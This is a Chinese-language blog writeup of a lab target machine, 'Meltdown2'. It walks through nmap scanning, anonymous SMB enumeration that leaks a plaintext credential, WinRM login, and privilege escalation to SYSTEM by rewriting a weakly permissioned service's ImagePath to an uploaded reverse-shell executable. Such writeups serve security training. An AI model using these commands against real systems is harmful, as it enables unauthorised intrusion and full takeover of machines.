{"pageProps":{"postData":{"id":"群U靶机-Meltdown2","contentHtml":"<h1>群U靶机-Meltdown2</h1>\n<blockquote>\n<p>作者 kaada</p>\n</blockquote>\n<h2>枚举</h2>\n<p>端口探测</p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">~</span> <span class=\"hljs-string\">nmap</span> <span class=\"hljs-string\">-sP</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span><span class=\"hljs-string\">/24</span>                    \n<span class=\"hljs-string\">Starting</span> <span class=\"hljs-string\">Nmap</span> <span class=\"hljs-number\">7.95</span> <span class=\"hljs-string\">(</span> <span class=\"hljs-string\">https://nmap.org</span> <span class=\"hljs-string\">)</span> <span class=\"hljs-string\">at</span> <span class=\"hljs-number\">2026-05-17 </span><span class=\"hljs-number\">13</span><span class=\"hljs-string\">:53</span> <span class=\"hljs-string\">CST</span>\n<span class=\"hljs-string\">Nmap</span> <span class=\"hljs-string\">scan</span> <span class=\"hljs-string\">report</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\n<span class=\"hljs-string\">Host</span> <span class=\"hljs-string\">is</span> <span class=\"hljs-string\">up</span> <span class=\"hljs-string\">(0.00049s</span> <span class=\"hljs-string\">latency).</span>\n<span class=\"hljs-attr\">MAC Address:</span> <span class=\"hljs-string\">0A:00:27:00:00:0D</span> <span class=\"hljs-string\">(Unknown)</span>\n<span class=\"hljs-string\">Nmap</span> <span class=\"hljs-string\">scan</span> <span class=\"hljs-string\">report</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\n<span class=\"hljs-string\">Host</span> <span class=\"hljs-string\">is</span> <span class=\"hljs-string\">up</span> <span class=\"hljs-string\">(0.00036s</span> <span class=\"hljs-string\">latency).</span>\n<span class=\"hljs-attr\">MAC Address:</span> <span class=\"hljs-number\">08</span><span class=\"hljs-string\">:00:27:24:40:E9</span> <span class=\"hljs-string\">(PCS</span> <span class=\"hljs-string\">Systemtechnik/Oracle</span> <span class=\"hljs-string\">VirtualBox</span> <span class=\"hljs-string\">virtual</span> <span class=\"hljs-string\">NIC)</span>\n<span class=\"hljs-string\">Nmap</span> <span class=\"hljs-string\">scan</span> <span class=\"hljs-string\">report</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.155</span>\n<span class=\"hljs-string\">Host</span> <span class=\"hljs-string\">is</span> <span class=\"hljs-string\">up</span> <span class=\"hljs-string\">(0.00034s</span> <span class=\"hljs-string\">latency).</span>\n<span class=\"hljs-attr\">MAC Address:</span> <span class=\"hljs-number\">08</span><span class=\"hljs-string\">:00:27:79:5D:DD</span> <span class=\"hljs-string\">(PCS</span> <span class=\"hljs-string\">Systemtechnik/Oracle</span> <span class=\"hljs-string\">VirtualBox</span> <span class=\"hljs-string\">virtual</span> <span class=\"hljs-string\">NIC)</span>\n<span class=\"hljs-string\">Nmap</span> <span class=\"hljs-string\">scan</span> <span class=\"hljs-string\">report</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.154</span>\n<span class=\"hljs-string\">Host</span> <span class=\"hljs-string\">is</span> <span class=\"hljs-string\">up.</span>\n<span class=\"hljs-attr\">Nmap done:</span> <span class=\"hljs-number\">256</span> <span class=\"hljs-string\">IP</span> <span class=\"hljs-string\">addresses</span> <span class=\"hljs-string\">(4</span> <span class=\"hljs-string\">hosts</span> <span class=\"hljs-string\">up)</span> <span class=\"hljs-string\">scanned</span> <span class=\"hljs-string\">in</span> <span class=\"hljs-number\">28.07</span> <span class=\"hljs-string\">seconds</span>\n</code></pre>\n<p>看端口是一台 windows 靶机</p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">~</span> <span class=\"hljs-string\">nmap</span> <span class=\"hljs-string\">-sT</span> <span class=\"hljs-string\">-min-rate</span> <span class=\"hljs-number\">10000</span> <span class=\"hljs-string\">-p-</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.155</span> \n<span class=\"hljs-string\">Starting</span> <span class=\"hljs-string\">Nmap</span> <span class=\"hljs-number\">7.95</span> <span class=\"hljs-string\">(</span> <span class=\"hljs-string\">https://nmap.org</span> <span class=\"hljs-string\">)</span> <span class=\"hljs-string\">at</span> <span class=\"hljs-number\">2026-05-17 </span><span class=\"hljs-number\">13</span><span class=\"hljs-string\">:55</span> <span class=\"hljs-string\">CST</span>\n<span class=\"hljs-string\">Nmap</span> <span class=\"hljs-string\">scan</span> <span class=\"hljs-string\">report</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.155</span>\n<span class=\"hljs-string\">Host</span> <span class=\"hljs-string\">is</span> <span class=\"hljs-string\">up</span> <span class=\"hljs-string\">(0.0015s</span> <span class=\"hljs-string\">latency).</span>\n<span class=\"hljs-attr\">Not shown:</span> <span class=\"hljs-number\">65528</span> <span class=\"hljs-string\">filtered</span> <span class=\"hljs-string\">tcp</span> <span class=\"hljs-string\">ports</span> <span class=\"hljs-string\">(no-response)</span>\n<span class=\"hljs-string\">PORT</span>      <span class=\"hljs-string\">STATE</span> <span class=\"hljs-string\">SERVICE</span>\n<span class=\"hljs-number\">135</span><span class=\"hljs-string\">/tcp</span>   <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">msrpc</span>\n<span class=\"hljs-number\">139</span><span class=\"hljs-string\">/tcp</span>   <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">netbios-ssn</span>\n<span class=\"hljs-number\">445</span><span class=\"hljs-string\">/tcp</span>   <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">microsoft-ds</span>\n<span class=\"hljs-number\">3389</span><span class=\"hljs-string\">/tcp</span>  <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">ms-wbt-server</span>\n<span class=\"hljs-number\">5985</span><span class=\"hljs-string\">/tcp</span>  <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">wsman</span>\n<span class=\"hljs-number\">49667</span><span class=\"hljs-string\">/tcp</span> <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">unknown</span>\n<span class=\"hljs-number\">49668</span><span class=\"hljs-string\">/tcp</span> <span class=\"hljs-string\">open</span>  <span class=\"hljs-string\">unknown</span>\n<span class=\"hljs-attr\">MAC Address:</span> <span class=\"hljs-number\">08</span><span class=\"hljs-string\">:00:27:79:5D:DD</span> <span class=\"hljs-string\">(PCS</span> <span class=\"hljs-string\">Systemtechnik/Oracle</span> <span class=\"hljs-string\">VirtualBox</span> <span class=\"hljs-string\">virtual</span> <span class=\"hljs-string\">NIC)</span>\n\n<span class=\"hljs-attr\">Nmap done:</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-string\">IP</span> <span class=\"hljs-string\">address</span> <span class=\"hljs-string\">(1</span> <span class=\"hljs-string\">host</span> <span class=\"hljs-string\">up)</span> <span class=\"hljs-string\">scanned</span> <span class=\"hljs-string\">in</span> <span class=\"hljs-number\">26.53</span> <span class=\"hljs-string\">seconds</span>\n</code></pre>\n<p>常规操作，先枚举 SMB</p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">~</span> <span class=\"hljs-string\">smbclient</span> <span class=\"hljs-string\">-L</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.155</span> <span class=\"hljs-string\">-U</span> <span class=\"hljs-string\">anonymous</span>             \n<span class=\"hljs-string\">Password</span> <span class=\"hljs-string\">for</span> [<span class=\"hljs-string\">WORKGROUP\\anonymous</span>]<span class=\"hljs-string\">:</span>\n\n        <span class=\"hljs-string\">Sharename</span>       <span class=\"hljs-string\">Type</span>      <span class=\"hljs-string\">Comment</span>\n        <span class=\"hljs-string\">---------</span>       <span class=\"hljs-string\">----</span>      <span class=\"hljs-string\">-------</span>\n        <span class=\"hljs-string\">ADMIN$</span>          <span class=\"hljs-string\">Disk</span>      <span class=\"hljs-string\">Remote</span> <span class=\"hljs-string\">Admin</span>\n        <span class=\"hljs-string\">C$</span>              <span class=\"hljs-string\">Disk</span>      <span class=\"hljs-string\">Default</span> <span class=\"hljs-string\">share</span>\n        <span class=\"hljs-string\">IPC$</span>            <span class=\"hljs-string\">IPC</span>       <span class=\"hljs-string\">Remote</span> <span class=\"hljs-string\">IPC</span>\n        <span class=\"hljs-string\">Reactor_Blueprint</span> <span class=\"hljs-string\">Disk</span>      <span class=\"hljs-string\">Nuclear</span> <span class=\"hljs-string\">Fusion</span> <span class=\"hljs-string\">Reactor</span> <span class=\"hljs-string\">Core</span> <span class=\"hljs-string\">Blueprints</span>\n<span class=\"hljs-string\">Reconnecting</span> <span class=\"hljs-string\">with</span> <span class=\"hljs-string\">SMB1</span> <span class=\"hljs-string\">for</span> <span class=\"hljs-string\">workgroup</span> <span class=\"hljs-string\">listing.</span>\n<span class=\"hljs-attr\">do_connect:</span> <span class=\"hljs-string\">Connection</span> <span class=\"hljs-string\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.155</span> <span class=\"hljs-string\">failed</span> <span class=\"hljs-string\">(Error</span> <span class=\"hljs-string\">NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span>\n<span class=\"hljs-string\">Unable</span> <span class=\"hljs-string\">to</span> <span class=\"hljs-string\">connect</span> <span class=\"hljs-string\">with</span> <span class=\"hljs-string\">SMB1</span> <span class=\"hljs-string\">--</span> <span class=\"hljs-literal\">no</span> <span class=\"hljs-string\">workgroup</span> <span class=\"hljs-string\">available</span>\n</code></pre>\n<p>得到一份 txt 文件</p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">~</span> <span class=\"hljs-string\">smbclient</span> <span class=\"hljs-string\">//192.168.56.155/Reactor_Blueprint</span>    \n<span class=\"hljs-string\">Password</span> <span class=\"hljs-string\">for</span> [<span class=\"hljs-string\">WORKGROUP\\root</span>]<span class=\"hljs-string\">:</span>\n<span class=\"hljs-string\">Try</span> <span class=\"hljs-string\">\"help\"</span> <span class=\"hljs-string\">to</span> <span class=\"hljs-string\">get</span> <span class=\"hljs-string\">a</span> <span class=\"hljs-string\">list</span> <span class=\"hljs-string\">of</span> <span class=\"hljs-string\">possible</span> <span class=\"hljs-string\">commands.</span>\n<span class=\"hljs-attr\">smb:</span> <span class=\"hljs-string\">\\></span> <span class=\"hljs-string\">ls</span>\n  <span class=\"hljs-string\">.</span>                                   <span class=\"hljs-string\">D</span>        <span class=\"hljs-number\">0</span>  <span class=\"hljs-string\">Wed</span> <span class=\"hljs-string\">Apr</span> <span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span><span class=\"hljs-string\">:38:33</span> <span class=\"hljs-number\">2026</span>\n  <span class=\"hljs-string\">..</span>                                <span class=\"hljs-string\">DHS</span>        <span class=\"hljs-number\">0</span>  <span class=\"hljs-string\">Sun</span> <span class=\"hljs-string\">May</span> <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span><span class=\"hljs-string\">:51:10</span> <span class=\"hljs-number\">2026</span>\n  <span class=\"hljs-string\">Blueprint.txt</span>                       <span class=\"hljs-string\">A</span>      <span class=\"hljs-number\">618</span>  <span class=\"hljs-string\">Wed</span> <span class=\"hljs-string\">Apr</span> <span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span><span class=\"hljs-string\">:38:33</span> <span class=\"hljs-number\">2026</span>\n\n                <span class=\"hljs-number\">13106687</span> <span class=\"hljs-string\">blocks</span> <span class=\"hljs-string\">of</span> <span class=\"hljs-string\">size</span> <span class=\"hljs-number\">4096. </span><span class=\"hljs-number\">10307194</span> <span class=\"hljs-string\">blocks</span> <span class=\"hljs-string\">available</span>\n</code></pre>\n<p>得到 <code>KagamineRin</code> 用户的凭据</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">meltdown2</span> <span class=\"hljs-string\">cat</span> <span class=\"hljs-string\">Blueprint.txt</span> \n<span class=\"hljs-string\">========================================================================</span>\n\n<span class=\"hljs-string\">========================================================================</span>\n<span class=\"hljs-string\">The</span> <span class=\"hljs-string\">ringing</span> <span class=\"hljs-string\">in</span> <span class=\"hljs-string\">my</span> <span class=\"hljs-string\">ears</span> <span class=\"hljs-string\">won't</span> <span class=\"hljs-string\">fade,</span> <span class=\"hljs-string\">won't</span> <span class=\"hljs-string\">stop...</span>\n<span class=\"hljs-string\">Allegro</span> <span class=\"hljs-string\">agitate.</span>\n<span class=\"hljs-string\">I</span> <span class=\"hljs-string\">dreamed</span> <span class=\"hljs-string\">the</span> <span class=\"hljs-string\">whole</span> <span class=\"hljs-string\">world</span> <span class=\"hljs-string\">vanished...</span>\n<span class=\"hljs-string\">In</span> <span class=\"hljs-string\">the</span> <span class=\"hljs-string\">night,</span> <span class=\"hljs-string\">my</span> <span class=\"hljs-string\">room</span> <span class=\"hljs-string\">feels</span> <span class=\"hljs-string\">vast</span>\n<span class=\"hljs-string\">And</span> <span class=\"hljs-string\">the</span> <span class=\"hljs-string\">silence</span> <span class=\"hljs-string\">chokes</span> <span class=\"hljs-string\">my</span> <span class=\"hljs-string\">heart.</span>\n\n \n<span class=\"hljs-string\">Unstable</span> <span class=\"hljs-string\">core</span> <span class=\"hljs-string\">temperature</span> <span class=\"hljs-string\">detected</span> <span class=\"hljs-string\">in</span> <span class=\"hljs-string\">the</span> <span class=\"hljs-string\">Nuclear</span> <span class=\"hljs-string\">Fusion</span> <span class=\"hljs-string\">Reactor.</span>\n<span class=\"hljs-string\">Operator</span> <span class=\"hljs-string\">Override</span> <span class=\"hljs-string\">Configuration</span> <span class=\"hljs-string\">Required</span> <span class=\"hljs-string\">to</span> <span class=\"hljs-string\">prevent</span> <span class=\"hljs-string\">complete</span> <span class=\"hljs-string\">Meltdown.</span>\n<span class=\"hljs-attr\">Assigned Operator Account:</span> <span class=\"hljs-string\">KagamineRin</span>\n<span class=\"hljs-attr\">Core Integrity Access Code:</span> <span class=\"hljs-string\">AllegroAgitate2026!</span>\n<span class=\"hljs-string\">========================================================================</span>\n</code></pre>\n<h2>提权</h2>\n<p>之前看到主机开了 5985 端口，所以这里尝试直接使用 evil-winrm 拿 <code>shell</code></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image1.png\" alt=\"image.png\"></p>\n<p>可以拿到 <code>user.txt</code></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image2.png\" alt=\"image.png\"></p>\n<p>跑一下 <code>winPEAS</code> ，能找到一个错误的配置，能让我们拿到高级别权限：服务注册表权限配置错误 (Weak Service Registry Permissions)</p>\n<p>当前用户 <code>KagamineRin</code> 对 <code>RoshinYuukai</code> （PS： <a href=\"https://www.youtube.com/watch?v=dSw8CucthGc\">https://www.youtube.com/watch?v=dSw8CucthGc</a> ）这个服务的注册表项拥有 <strong>FullControl</strong> 权限</p>\n<p>因为拥有 FullControl 权限，我们可以直接修改 <code>ImagePath</code> 的值，将其替换为我们的提权 Payload（如反弹 Shell 的 exe）。随后只要重启该服务，Payload 就会以服务本身的系统级权限运行，完成提权。</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image3.png\" alt=\"image.png\"></p>\n<p>创建一个反弹 shell 的 exe 文件</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image4.png\" alt=\"image.png\"></p>\n<p>上传并修改服务的 <code>ImagePath</code> ，然后启动服务，即可拿到 system 权限的 shell</p>\n<pre><code class=\"hljs language-yaml\"><span class=\"hljs-string\">upload</span> <span class=\"hljs-number\">2.</span><span class=\"hljs-string\">exe</span>\n<span class=\"hljs-string\">Set-ItemProperty</span> <span class=\"hljs-string\">-Path</span> <span class=\"hljs-string\">\"HKLM:\\system\\currentcontrolset\\services\\RoshinYuukai\"</span> <span class=\"hljs-string\">-Name</span> <span class=\"hljs-string\">\"ImagePath\"</span> <span class=\"hljs-string\">-Value</span> <span class=\"hljs-string\">\"C:\\1\\2.exe\"</span>\n<span class=\"hljs-string\">Start-Service</span> <span class=\"hljs-string\">RoshinYuukai</span>\n</code></pre>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image5.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BA-Meltdown2/image6.png\" alt=\"image.png\"></p>\n<h2>end</h2>\n<p>最近几个月因为一些原因没有更新…</p>","title":"群U靶机 - Meltdown2","date":"2026-05-17","updated":"2026-05-17","tags":["Windows","Service","SMB"],"categories":"靶机","comments":true,"description":"群U靶机 Meltdown2 渗透测试 writeup，涵盖 Windows 服务漏洞利用、SMB 攻击与权限提升全过程。"},"recentPosts":[{"id":"群U靶机-Meltdown2","title":"群U靶机 - Meltdown2","date":"2026-05-17","isEncrypted":false,"year":"2026","month":"05","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Machine - Signed","date":"2025-10-14","isEncrypted":false,"year":"2026","month":"05","day":"14"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Machine - Editor","date":"2025-08-03","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Machine - Era","date":"2025-07-29","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Machine - Mirage","date":"2025-07-22","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Machine - Outbound","date":"2025-07-13","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason7-Titanic","title":"HackTheBox - Machine -Titanic","date":"2025-04-04","isEncrypted":false,"year":"2026","month":"05","day":"13"}]},"__N_SSG":true}